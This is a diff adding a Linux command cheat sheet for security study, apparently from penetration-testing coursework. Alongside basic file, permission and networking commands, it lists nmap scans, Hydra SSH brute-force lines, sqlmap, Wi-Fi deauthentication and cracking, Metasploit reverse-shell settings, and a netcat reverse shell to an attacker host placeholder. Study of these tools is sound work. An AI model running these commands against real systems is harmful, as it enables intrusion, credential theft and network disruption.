@@ -1,0 +1,318 @@
+================================================================================
+                        LINUX COMMANDS - SECURITY REFERENCE
+================================================================================
+
+--------------------------------------------------------------------------------
+BASIC FILE & DIRECTORY COMMANDS
+--------------------------------------------------------------------------------
+
+  .                              Current directory
+  ls                             List files in a directory
+  ls -lh <file>                  List with details, check file owner/permissions
+  ls -al                         List all files including hidden, with details
+  pwd                            Show current directory path
+  cd <directory>                 Change directory
+  mkdir <foldername>             Create a new folder
+  rm <file>                      Delete a file
+  rm -r <folder>                 Delete a folder and its contents
+  cp <source> <destination>      Copy files or directories
+  mv <source> <destination>      Move or rename files/directories
+  gunzip <file>                  Extract/decompress a .gz file
+  man <command>                  Display the manual for a command (e.g. man hydra)
+  sudo chown kali:kali .         Fix ownership so your kali user can access and modify the directory
+  exec bash                      Refreshes shell
+  mkdir dir1/dir2                Making multiple directories
+  rm -rf                         Recursive so deleting everything inside (rm -rf dir1)
+  touch <file>                   Quickly make a file or document
+  echo "text" > file             Overwrite with text
+  echo "text" >> file            Append text, add onto it
+  tee                            Takes input and writes it to a file
+  -a                             Flag means append add to existing instead of overwriting
+
+--------------------------------------------------------------------------------
+FILE PERMISSIONS — CHMOD
+--------------------------------------------------------------------------------
+
+  chmod changes the read, write, and execute permissions on files and directories.
+  Permissions control who can read, modify, or run a file.
+
+  Every file has three permission groups:
+    Owner    The user who owns the file
+    Group    Users in the file's group
+    Others   Everyone else
+
+  Each group has three permission types:
+    r = read     (value: 4)
+    w = write    (value: 2)
+    x = execute  (value: 1)
+
+  Each digit in the permission number is the sum of r+w+x for that group:
+    7 = rwx  (4+2+1)   full access
+    6 = rw-  (4+2)     read and write
+    5 = r-x  (4+1)     read and execute
+    4 = r--  (4)       read only
+    0 = ---            no access at all
+
+  NUMERIC MODE
+  ------------
+
+  chmod 777 <file>               rwxrwxrwx — everyone has full access (dangerous)
+  chmod 755 <file>               rwxr-xr-x — owner full, others read/execute
+  chmod 700 <file>               rwx------ — owner only, no one else can access
+  chmod 644 <file>               rw-r--r-- — owner read/write, others read only
+  chmod 600 <file>               rw------- — owner read/write only (good for keys)
+  chmod 400 <file>               r-------- — read only for owner (sensitive files)
+
+  SYMBOLIC MODE
+  -------------
+
+  chmod +x <file>                Add execute permission for everyone
+  chmod -x <file>                Remove execute permission for everyone
+  chmod u+x <file>               Add execute for owner only
+  chmod g+w <file>               Add write for group only
+  chmod o-r <file>               Remove read from others
+  chmod a+x <file>               Add execute for all (owner + group + others)
+  chmod -R 755 /var/www/html     Apply permissions recursively to folder and contents
+
+  EXAMPLES
+  --------
+
+  chmod +x exploit.py            Make a script executable before running it
+  chmod 600 id_rsa               Lock down an SSH private key (required by SSH)
+  chmod 644 index.html           Web file — owner edits it, server reads it
+  chmod 755 /usr/local/bin/tool  Make a tool executable by all users on the system
+
+  CHECKING PERMISSIONS
+  --------------------
+
+  ls -la <file>                  Show permissions for a file
+  stat <file>                    Show detailed file info including permissions
+
+  READING PERMISSION OUTPUT
+  -------------------------
+
+  When you run ls -la you will see output like:
+  -rwxr-xr--  1  neo  neo  4096  Feb 26  file.sh
+
+    -           File type  (- = file,  d = directory,  l = symlink)
+    rwx         Owner permissions  (read, write, execute)
+    r-x         Group permissions  (read, no write, execute)
+    r--         Others permissions (read only)
+
+--------------------------------------------------------------------------------
+REDIRECTS & PIPES
+--------------------------------------------------------------------------------
+
+  >     Output redirect — send output to a file (overwrites existing content)
+  >>    Append redirect — add output to the end of a file
+  <     Input redirect  — feed a file into a command as input
+  |     Pipe            — send output of one command directly into another
+
+  OUTPUT REDIRECT  >
+  ------------------
+
+  Sends command output into a file. OVERWRITES the file if it already exists.
+
+  echo "hello" > file.txt               Create file.txt containing "hello"
+  nmap -sV 192.168.1.1 > scan.txt       Save nmap output to a file
+  ls -la > listing.txt                  Save directory listing to a file
+  cat /etc/passwd > passwords.txt       Copy file contents into a new file
+
+  APPEND REDIRECT  >>
+  --------------------
+
+  Sends output to a file but ADDS to the end instead of overwriting.
+
+  echo "second line" >> file.txt        Add a line without overwriting
+  nmap -sV 192.168.1.2 >> scan.txt      Add more results to an existing scan file
+  echo "found host" >> results.txt      Keep building a results file over time
+
+  INPUT REDIRECT  <
+  ------------------
+
+  Feeds the contents of a file into a command as input.
+
+  john --wordlist=rockyou.txt < hashes.txt     Feed hashes file into john
+  mysql -u root -p < backup.sql                Run SQL commands from a file
+  wc -l < targets.txt                          Count lines in a file
+
+  PIPE  |
+  -------
+
+  Takes output of one command and passes it directly into another.
+  One of the most powerful and commonly used features in Linux.
+
+  cat file.txt | grep "password"        Find lines containing "password"
+  ps aux | grep apache                  Find running apache processes
+  nmap -sV 192.168.1.1 | grep open      Show only open ports from nmap output
+  cat /etc/passwd | cut -d: -f1         Extract just the usernames
+  cat passwords.txt | wc -l             Count how many lines are in a file
+
+  CHAINING EXAMPLES
+  -----------------
+
+  cat /etc/passwd | grep "/bin/bash" | cut -d: -f1 > shell_users.txt
+  (find users with bash shell, extract usernames, save to file)
+
+  nmap -sn 192.168.1.0/24 | grep "report" | awk '{print $5}' > live_hosts.txt
+  (ping sweep, filter results, extract IPs, save to file)
+
+  strings malware.exe | grep -i "http" > urls.txt
+  (extract strings from a binary, filter for URLs, save to file)
+
+  cat access.log | grep "200" | awk '{print $1}' | sort | uniq -c | sort -rn
+  (find the most active IPs from a web server access log)
+
+  SPECIAL REDIRECTS
+  -----------------
+
+  2>/dev/null          Suppress error messages — send errors to nowhere
+  2>&1                 Redirect errors to the same place as normal output
+  tee <file>           Show output in terminal AND save to file simultaneously
+
+  find / -perm -4000 2>/dev/null                       Find SUID files, hide errors
+  nmap -sV 192.168.1.0/24 2>/dev/null | tee out.txt   Scan, suppress errors, save output
+  hydra -L users.txt -P rockyou.txt ssh://192.168.1.1 2>&1 | tee results.txt
+
+--------------------------------------------------------------------------------
+DISK & STORAGE
+--------------------------------------------------------------------------------
+
+  df                             Show disk space usage (filesystems)
+  du -h                          Show directory/file sizes in human-readable form
+
+--------------------------------------------------------------------------------
+SYSTEM INFORMATION & PROCESS MANAGEMENT
+--------------------------------------------------------------------------------
+
+  uname -a                       Display full system information
+  uptime                         Show how long the system has been running
+  whoami                         Display the current logged-in user
+  ps aux                         Show all running processes
+  top                            Real-time process viewer
+  htop                           Interactive process viewer (more user-friendly)
+  kill <PID>                     Kill a process by its PID
+  pkill <name>                   Kill a process by name
+
+--------------------------------------------------------------------------------
+NETWORKING COMMANDS
+--------------------------------------------------------------------------------
+
+  ifconfig                       Show network interfaces and IP addresses
+  ip a                           Show IP addresses (modern alternative to ifconfig)
+  ping <IP>                      Send ICMP packets to test connectivity
+  netstat -tulnp                 Show open ports and listening services
+  traceroute <IP>                Trace the route packets take to a host
+  nslookup <domain>              Get basic DNS information for a domain
+  dig <domain>                   Retrieve detailed DNS information
+  whois <domain>                 Fetch domain registration details
+
+--------------------------------------------------------------------------------
+SCANNING & ENUMERATION
+--------------------------------------------------------------------------------
+
+  NMAP SCANS
+  ----------
+
+  nmap -sn 192.168.1.0/24               Ping sweep — discover live hosts on subnet
+  nmap -sT <IP>                         TCP Connect Scan (full handshake, louder)
+  nmap -sS <IP>                         SYN Scan (stealth scan, half-open)
+  nmap -sU <IP>                         UDP Scan
+  nmap -A <IP>                          Aggressive scan — OS detection, scripts, traceroute
+
+  WEB ENUMERATION
+  ---------------
+
+  nikto -h <IP>                         Web vulnerability scanner
+  whatweb <URL>                         Identify web technologies and CMS
+  gobuster dir -u <URL> -w <wordlist>   Directory and file brute-forcing
+
+--------------------------------------------------------------------------------
+EXPLOITATION & ATTACKING
+--------------------------------------------------------------------------------
+
+  METASPLOIT
+  ----------
+
+  msfconsole                     Start the Metasploit Framework
+  search exploit <keyword>       Search for exploits by keyword
+  use <exploit>                  Select an exploit module
+  set LHOST <IP>                 Set local (attacker) IP for reverse shell
+  set LPORT <port>               Set the listening port
+  exploit                        Run the selected exploit
+
+  WEB ATTACKS
+  -----------
+
+  sqlmap -u <URL> --dbs          Automated SQL injection — enumerate databases
+
+  BRUTE FORCE (HYDRA)
+  -------------------
+
+  hydra -l <user> -P <wordlist> <IP> ssh               Basic SSH brute force
+  hydra -l admin -P passlist.txt ssh://192.168.1.11 -t 4 -f    Known user attack
+  hydra -L users.txt -P passlist.txt ssh://192.168.1.11 -t 4 -f    Unknown user attack
+
+  (See HYDRA reference sheet for full options and flags)
+
+--------------------------------------------------------------------------------
+WIRELESS ATTACKS
+--------------------------------------------------------------------------------
+
+  airmon-ng start wlan0                              Enable monitor mode on adapter
+  airodump-ng wlan0mon                               Capture packets on wireless networks
+  aireplay-ng -0 5 -a <BSSID> wlan0mon              Deauthenticate clients (5 packets)
+  aircrack-ng -w <wordlist> -b <BSSID> <capfile>    Crack captured Wi-Fi handshake
+
+--------------------------------------------------------------------------------
+PRIVILEGE ESCALATION & POST-EXPLOITATION
+--------------------------------------------------------------------------------
+
+  sudo -l                                            Check current sudo privileges
+  find / -perm -4000 2>/dev/null                     Find SUID binaries (potential privesc)
+  python -c 'import pty; pty.spawn("/bin/bash")'     Spawn a TTY shell (stabilise shell)
+
+  NETCAT
+  ------
+
+  nc -lvnp <port>                          Listen for incoming connection (attacker side)
+  nc <attacker_IP> <port> -e /bin/bash     Reverse shell back to attacker
+
+--------------------------------------------------------------------------------
+PASSWORD CRACKING
+--------------------------------------------------------------------------------
+
+  john --wordlist=<wordlist> <hashfile>              Crack hashes with John the Ripper
+  hashcat -m 0 -a 0 <hashfile> <wordlist>           Crack hashes with Hashcat (MD5 mode)
+  hash-identifier                                    Identify the type of a hash
+  cewl -w <wordlist> -d 2 <URL>                     Generate wordlist from website content
+  crunch 8 8 abc123 -o wordlist.txt                 Generate custom wordlist (8 char, set: abc123)
+
+--------------------------------------------------------------------------------
+WIRESHARK & PACKET ANALYSIS
+--------------------------------------------------------------------------------
+
+  wireshark &                    Launch Wireshark GUI in background
+  tshark -i wlan0                Capture packets via terminal on wlan0
+  tcpdump -i eth0                Capture all traffic on eth0
+  tcpdump -A -s0 port 80         Capture and display HTTP traffic in ASCII
+
+--------------------------------------------------------------------------------
+FORENSICS & STEGANOGRAPHY
+--------------------------------------------------------------------------------
+
+  binwalk -e <file>              Extract hidden/embedded data from a file
+  strings <file>                 Extract human-readable strings from a binary
+  steghide extract -sf <file>    Extract hidden data from an image file
+  foremost -i <file> -o <dir>    Recover deleted/hidden files from a file/image
+  autopsy                        Launch Autopsy — GUI digital forensics platform
+
+--------------------------------------------------------------------------------
+MISCELLANEOUS / USEFUL
+--------------------------------------------------------------------------------
+
+  tor                            Start the Tor service for anonymised routing
+  proxychains nmap -sT <IP>      Route Nmap (or any command) through proxychains
+  sudo gunzip /usr/share/wordlists/rockyou.txt.gz    Decompress rockyou wordlist
+
+================================================================================
